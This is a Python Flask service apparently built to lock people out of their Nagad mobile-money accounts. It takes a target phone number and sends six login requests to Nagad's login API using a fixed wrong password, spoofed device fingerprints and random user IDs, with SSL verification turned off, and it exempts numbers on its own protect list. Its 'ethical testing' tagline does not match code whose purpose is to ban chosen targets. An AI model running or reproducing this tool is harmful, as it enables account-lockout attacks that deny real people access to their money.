from flask import Flask, request, jsonify
import aiohttp
import asyncio
import json
import random
import string
import os

app = Flask(__name__)

NAGAD_URL = "https://app2.mynagad.com:20002/api/login"
NAGAD_PASSWORD = "B3282A2F2A28757B3A18AB833DE16A9C54518C0B0CF493E3F0A7CF09386F326A"

PROTECT = ["01733772711", "01988526736"]

BRANDING = {
    "team": "⚡ YOUR TEAM NAME ⚡",
    "message": "Message: Target Activated — Login Attempted (6x)",
    "tagline": "Ethical security testing only.",
}

LOOP = 6

def normalize_num(raw):
    digits = "".join(ch for ch in raw if ch.isdigit())
    if len(digits) < 11:
        return None
    return digits[-11:]

def is_protected(num):
    for p in PROTECT:
        pd = p if isinstance(p, str) else str(p)
        if pd == num or pd[-11:] == num:
            return True
    return False

def generate_device_fgp():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=64))

def build_payload(username):
    return {
        "aspId": "100012345612345",
        "mpaId": None,
        "password": NAGAD_PASSWORD,
        "username": username,
    }

# aiohttp দিয়ে অ্যাসিনক্রোনাস রিকোয়েস্ট পাঠানোর ফাংশন
async def send_single_request(session, username, attempt_no):
    dynamic_headers = {
        "Host": "app2.mynagad.com:20002",
        "User-Agent": "okhttp/5.0.0-alpha.7",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "X-KM-UserId": str(random.randint(10000000, 99999999)),
        "X-KM-User-AspId": "100012345612345",
        "X-KM-User-Agent": "ANDROID/1220",
        "X-KM-DEVICE-FGP": generate_device_fgp(),
        "X-KM-Accept-language": "bn",
        "X-KM-AppCode": "01",
        "Content-Type": "application/json; charset=UTF-8",
    }

    try:
        # ssl=False দিয়ে এসএসএল সার্টিফিকেট ভেরিফিকেশন বাইপাস করা হয়েছে
        async with session.post(NAGAD_URL, headers=dynamic_headers,
                                json=build_payload(username),
                                timeout=12, ssl=False) as response:
            status = response.status
            text = await response.text()
            
            try:
                res_json = json.loads(text)
                masked_response = json.dumps(res_json, separators=(',', ':'), ensure_ascii=False)
            except:
                masked_response = json.dumps({"raw_response": text[:400]}, separators=(',', ':'), ensure_ascii=False)

            return {
                "attempt": attempt_no,
                "status": status,
                "response": masked_response
            }
    except Exception as e:
        err_masked = json.dumps({"error": str(e)[:150]}, separators=(',', ':'), ensure_ascii=False)
        return {
            "attempt": attempt_no,
            "status": None,
            "response": err_masked
        }

async def nagad_ban_async(username, loop=LOOP):
    attempts = []
    # aiohttp সেশন তৈরি
    async with aiohttp.ClientSession() as session:
        for i in range(1, loop + 1):
            res = await send_single_request(session, username, i)
            attempts.append(res)
            if i < loop:
                await asyncio.sleep(0.5)
    return attempts

@app.route("/ban", methods=["GET"])
def ban():
    raw = request.args.get("num", "").strip()
    num = normalize_num(raw)
    if not num:
        return jsonify({"success": False, "error": "Invalid number. Use /ban?num=01313613360"}), 400

    if is_protected(num):
        return jsonify({
            "success": False,
            "blocked": True,
            "message": "⛔ এই নম্বরটি protect list-এ আছে — request পাঠানো হয়নি।",
            "protect_list": PROTECT,
            "custom": "এই নম্বরটি সুরক্ষিত, এটা বাদ দিন।",
        }), 403

    # Flask এর ভেতরে aiohttp এর রুটিন রান করার জন্য
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    attempts = loop.run_until_complete(nagad_ban_async(num))

    return jsonify({
        "success": True,
        "target": num,
        "loop": LOOP,
        "login_attempts": attempts,
        "branding": BRANDING,
    })

@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "app": "Nagad Ban aiohttp Ready",
        "usage": "/ban?num=01313613360",
        "protected_count": len(PROTECT),
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
